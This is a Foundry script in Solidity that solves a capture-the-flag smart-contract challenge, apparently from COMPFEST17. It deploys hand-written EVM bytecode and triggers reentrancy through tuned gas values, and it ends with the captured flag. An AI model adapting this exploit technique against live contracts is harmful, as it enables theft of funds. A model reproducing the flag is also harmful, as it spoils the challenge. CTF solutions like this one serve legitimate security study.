// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "./challenge/Setup.sol";

// forge script src/Compfest2025/SnakeInception/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY -vvvvv --broadcast

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();

        // Setup 1.
        new Exploit();

        // Setup 2.
        // Run cast send (cast address-zero) --value 0 --private-key $PRIVATE_KEY --json | jq .blockHash -r | python -c "import sys; print(int(input(), 16) % 5)"
        // until convert(blockhash(block.number-1), uint256) % 5 == 0

        // Setup 3.
        Exploit(0xA68e541c388a904e398968C8D37815CCed3f2D5e).exploit{gas: 5000000}();

        vm.stopBroadcast();
    }
}

contract Exploit {
    Setup setup = Setup(0x4Cdb866705AF7F07029c85503245988Acdd4a5B7);
    address exploitAddr;

    constructor() {
        bytes memory bytecode =
            hex"63c48924a35f556309775b4760015573cef1ef6e3478d476d3ddb843f7547227fb866a15600255601c6003557fba76c938bca5ba6daf32f8940f109d10a5e0cd681900c4b0d1152ba90c72707a6004557fd21a7983cb860b1db4ba9571efee60fdc6ac7b02a3a8b5a082f46bab6c5db47c600555602b80607d5f395ff360025a06545f5260035459526004546040526005546060526020608059601c5f6002545af15f5260205ff3";
        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        exploitAddr = addr;
    }

    function exploit() public {
        address(this).call{gas: 2000001}(abi.encodeWithSignature("exploit(uint256)", 1000001));
        address(this).call{gas: 2000002}(abi.encodeWithSignature("exploit(uint256)", 1000002));
    }

    function exploit(uint256 gas) public {
        exploitAddr.call{gas: gas}("");
        require(setup.isSolved());
    }
}

// COMPFEST17{re3ntr4ncY_thrU_E04_c0d3L3ss_re3ntr4ncY_1s_p0ssible_8c8be953a5}
